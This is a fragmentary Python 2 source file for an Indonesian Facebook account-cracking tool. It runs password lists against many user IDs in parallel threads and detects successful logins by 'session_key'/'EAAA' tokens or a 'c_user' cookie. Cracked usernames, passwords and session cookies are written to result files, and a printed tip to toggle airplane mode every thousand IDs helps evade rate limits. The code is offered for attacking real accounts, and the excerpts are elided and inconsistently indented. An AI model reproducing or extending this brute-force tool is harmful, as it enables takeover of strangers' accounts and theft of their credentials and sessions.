...
def banner():
	print (''' %s 
 © Group%s  ______             %s> %sZona /_  __/__  _______ _ %s> %sAkun %s>%s / / / _ \/ __/ _ `/ Facebook [Meta] \n /_______ (____  /__|  |__| %s>%s Indonesia \n         \/    \/ \n %s[%s*%s] By : %sNaZir-XD \n %s[%s*%s] -------------------------------------- \n [%s*%s] IP : %s%s'''%
...
class ngentod:
    ...
    def langsung(self):
        ...
        if suuu == '':
            ...
            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sNK %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
    ...
    def b_api(self, user, zona):
        ...
        for pw in zona:
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                ...
                try:
                    ...
                    open('hasil/NK-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
        ...
        print('\r %s*--> %s/%s [OK-:%s]-[NK-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def basic(self, user, zona):
        ...
        for pw in zona:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                open('hasil/NK-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s\n"%(user,pw,kuki))
                break
                continue
                ...
                print '\r %s*--> %s ◊ %s            ' % (K,user,pw)
                cp.append("%s ◊ %s"% (user,pw))
                open('hasil/NK-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
	...
	for pas in pwx:
		if looping != 1:
			...
			if len(status_foll) != 1:
				...
				print "\r "+rm+"*--> %s/%s [OK:%s]-[NK:%s] "%(str(loping),len(mi),len(ok),len(cp)),
				sys.stdout.flush()
				c_bff_ -= 1
			else:
				pass
...
def hasill(c):
	if c in[""]:
		...
		try:
			...
			print("\n %s[%s!%s] cth : NK-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
        ...
        print "%s [02] Hasil crack akun %sNK "%(P,K)
        while True:
        	rom = raw_input('\n%s [?] Menu : %s'%(P,K))
		if rom in['1','01']:
			try:
